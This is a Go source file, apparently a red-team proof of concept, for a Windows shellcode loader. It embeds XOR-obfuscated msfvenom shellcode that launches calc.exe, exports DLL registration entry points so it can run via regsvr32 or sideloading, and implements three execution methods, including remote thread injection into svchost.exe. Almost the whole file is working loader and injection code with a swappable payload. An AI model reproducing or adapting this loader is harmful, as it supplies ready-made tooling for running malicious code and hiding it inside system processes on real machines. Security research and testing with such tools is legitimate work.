//
// Shellcode Execution POC
// Author: Joff Thyer
// Copyright (c) 2021
// River Gum Security LLC
//

package main

import (
	"fmt"
	"syscall"
	"unsafe"

	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
)

import "C"

// msfvenom -p windows/x64/exec CMD=calc.exe -f raw
// subsequently XOR'ed with the number 31
var buf = []byte{
	0xe3, 0x57, 0x9c, 0xfb, 0xef, 0xf7, 0xdf, 0x1f, 0x1f, 0x1f, 0x5e, 0x4e, 0x5e, 0x4f, 0x4d, 0x4e,
	0x49, 0x57, 0x2e, 0xcd, 0x7a, 0x57, 0x94, 0x4d, 0x7f, 0x57, 0x94, 0x4d, 0x07, 0x57, 0x94, 0x4d,
	0x3f, 0x57, 0x94, 0x6d, 0x4f, 0x57, 0x10, 0xa8, 0x55, 0x55, 0x52, 0x2e, 0xd6, 0x57, 0x2e, 0xdf,
	0xb3, 0x23, 0x7e, 0x63, 0x1d, 0x33, 0x3f, 0x5e, 0xde, 0xd6, 0x12, 0x5e, 0x1e, 0xde, 0xfd, 0xf2,
	0x4d, 0x5e, 0x4e, 0x57, 0x94, 0x4d, 0x3f, 0x94, 0x5d, 0x23, 0x57, 0x1e, 0xcf, 0x94, 0x9f, 0x97,
	0x1f, 0x1f, 0x1f, 0x57, 0x9a, 0xdf, 0x6b, 0x78, 0x57, 0x1e, 0xcf, 0x4f, 0x94, 0x57, 0x07, 0x5b,
	0x94, 0x5f, 0x3f, 0x56, 0x1e, 0xcf, 0xfc, 0x49, 0x57, 0xe0, 0xd6, 0x5e, 0x94, 0x2b, 0x97, 0x57,
	0x1e, 0xc9, 0x52, 0x2e, 0xd6, 0x57, 0x2e, 0xdf, 0xb3, 0x5e, 0xde, 0xd6, 0x12, 0x5e, 0x1e, 0xde,
	0x27, 0xff, 0x6a, 0xee, 0x53, 0x1c, 0x53, 0x3b, 0x17, 0x5a, 0x26, 0xce, 0x6a, 0xc7, 0x47, 0x5b,
	0x94, 0x5f, 0x3b, 0x56, 0x1e, 0xcf, 0x79, 0x5e, 0x94, 0x13, 0x57, 0x5b, 0x94, 0x5f, 0x03, 0x56,
	0x1e, 0xcf, 0x5e, 0x94, 0x1b, 0x97, 0x57, 0x1e, 0xcf, 0x5e, 0x47, 0x5e, 0x47, 0x41, 0x46, 0x45,
	0x5e, 0x47, 0x5e, 0x46, 0x5e, 0x45, 0x57, 0x9c, 0xf3, 0x3f, 0x5e, 0x4d, 0xe0, 0xff, 0x47, 0x5e,
	0x46, 0x45, 0x57, 0x94, 0x0d, 0xf6, 0x48, 0xe0, 0xe0, 0xe0, 0x42, 0x57, 0xa5, 0x1e, 0x1f, 0x1f,
	0x1f, 0x1f, 0x1f, 0x1f, 0x1f, 0x57, 0x92, 0x92, 0x1e, 0x1e, 0x1f, 0x1f, 0x5e, 0xa5, 0x2e, 0x94,
	0x70, 0x98, 0xe0, 0xca, 0xa4, 0xef, 0xaa, 0xbd, 0x49, 0x5e, 0xa5, 0xb9, 0x8a, 0xa2, 0x82, 0xe0,
	0xca, 0x57, 0x9c, 0xdb, 0x37, 0x23, 0x19, 0x63, 0x15, 0x9f, 0xe4, 0xff, 0x6a, 0x1a, 0xa4, 0x58,
	0x0c, 0x6d, 0x70, 0x75, 0x1f, 0x46, 0x5e, 0x96, 0xc5, 0xe0, 0xca, 0x7c, 0x7e, 0x73, 0x7c, 0x1f}

//export Engage
func Engage() {
	main()
}

//export EntryPoint
func EntryPoint() bool {
	return true
}

//export DllRegisterServer
func DllRegisterServer() bool {
	return true
}

//export DllUnregisterServer
func DllUnregisterServer() bool {
	return true
}

//export DllInstall
func DllInstall() bool {
	main()
	return true
}

func xor(buf []byte, xorchar byte) []byte {
	res := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		res[i] = xorchar ^ buf[i]
	}
	return res
}

func findProcess(proc string) int {
	processList, err := ps.Processes()
	if err != nil {
		return -1
	}

	for x := range processList {
		var process ps.Process
		process = processList[x]
		if process.Executable() != proc {
			continue
		}
		p, errOpenProcess := windows.OpenProcess(
			windows.PROCESS_VM_OPERATION, false, uint32(process.Pid()))
		if errOpenProcess != nil {
			continue
		}
		windows.CloseHandle(p)
		return process.Pid()
	}
	return 0
}

func method1_SysCall(sc []byte) {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}

func method2_CreateThread(sc []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	CreateThread := kernel32.NewProc("CreateThread")

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}
	thread, _, err := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	if err.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] CreateThread(): %s", err.Error()))
	}
	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}

func method3_InjectProcess(sc []byte) {
	pid := findProcess("svchost.exe")
	fmt.Printf("    [*] Injecting into svchost.exe, PID=[%d]\n", pid)
	if pid == 0 {
		panic("Cannot find svchost.exe process")
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	proc, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if errOpenProcess != nil {
		panic(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(proc), 0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(proc), addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	op := 0
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(proc), addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&op)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(proc), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
	}

	errCloseHandle := windows.CloseHandle(proc)
	if errCloseHandle != nil {
		panic(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}
}

func main() {
	method1_SysCall(xor(buf, 31))
}
